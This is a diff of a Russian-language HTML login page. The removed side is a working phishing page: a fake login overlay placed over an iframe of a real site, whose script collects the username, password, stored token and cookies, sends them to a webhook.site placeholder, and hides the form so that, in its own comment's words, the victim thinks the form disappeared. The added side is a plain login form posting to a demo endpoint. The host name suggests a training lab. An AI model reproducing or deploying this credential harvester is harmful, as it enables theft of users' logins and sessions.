@@ -2,75 +2,51 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Подарок 🎁</title>
+  <title>Войти</title>
   <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-    iframe {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      border: none;
-      z-index: 1;
-    }
-    .overlay-form {
-      position: absolute;
-      top: 20%;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(255, 255, 255, 0.9);
-      padding: 20px;
-      border-radius: 10px;
-      z-index: 999;
-      box-shadow: 0 0 20px rgba(0,0,0,0.2);
-    }
-    .overlay-form input {
-      display: block;
-      margin: 10px 0;
-      padding: 10px;
-      width: 250px;
-    }
+    body { font-family: sans-serif; padding: 30px; text-align: center; }
+    input, button { padding: 10px; margin: 10px; width: 250px; }
+    .error { color: red; }
   </style>
 </head>
 <body>
-
-  <!-- Оригинальный сайт -->
-  <iframe src="https://kazcyber.zapto.org/login.php"></iframe>
-
-  <!-- Фишинг-форма сверху -->
-  <div class="overlay-form">
-    <h3>Подтвердите вход</h3>
-    <form id="fakeLogin">
-      <input type="text" id="username" placeholder="Логин" required>
-      <input type="password" id="password" placeholder="Пароль" required>
-      <button type="submit">Войти</button>
-    </form>
-  </div>
+  <h2>Вход в систему</h2>
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Логин" required><br>
+    <input type="password" id="password" placeholder="Пароль" required><br>
+    <button type="submit">Войти</button>
+  </form>
+  <p class="error" id="errorMessage"></p>
 
   <script>
-    document.getElementById("fakeLogin").addEventListener("submit", function (e) {
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
-      const token = localStorage.getItem("token");
-      const cookies = document.cookie;
+      const errorMsg = document.getElementById("errorMessage");
 
-      // Отправка в webhook
-      fetch("https://webhook.site/ВАШ_ID", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password, token, cookies })
-      });
+      try {
+        const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          credentials: "include", // ВАЖНО: позволяет получить куки от kazcyber.zapto.org
+          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+        });
 
-      // Скрытие фишинг-формы (жертва думает, что форма исчезла)
-      document.querySelector(".overlay-form").style.display = "none";
+        const text = await res.text();
+
+        if (text.includes("Неверный") || text.includes("неверный")) {
+          errorMsg.textContent = "❌ Неверный логин или пароль";
+        } else {
+          window.location.href = "https://kazcyber.zapto.org/index.php";
+        }
+      } catch (err) {
+        errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
+      }
     });
   </script>
-
 </body>
 </html>
